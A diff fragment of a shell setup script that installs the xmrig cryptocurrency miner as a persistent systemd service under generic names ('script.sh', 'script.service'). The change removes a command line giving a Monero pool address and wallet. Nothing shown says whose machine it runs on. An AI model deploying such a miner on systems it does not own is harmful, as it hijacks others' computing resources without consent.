@@ -17,7 +17,7 @@ sudo chmod +x xmrig
 # Write to /usr/local/bin/script.sh
 cat <<EOL | sudo tee /usr/local/bin/script.sh > /dev/null
 #!/bin/bash
-./xmrig-6.18.0/xmrig -a randomx -o xmr.kryptex.network:7777 -u 41gm7v89Rw8W5AeCcBVj3yZnQhZSSJoPaKrfWC1oWyNeiPTGc7FGkHp7xUf8nn7jbAXo4YxYtb8V6WTa3h9oAxDWVADG37A.test --coin monero
+./xmrig
 EOL
 
 # Write to /etc/systemd/system/script.service
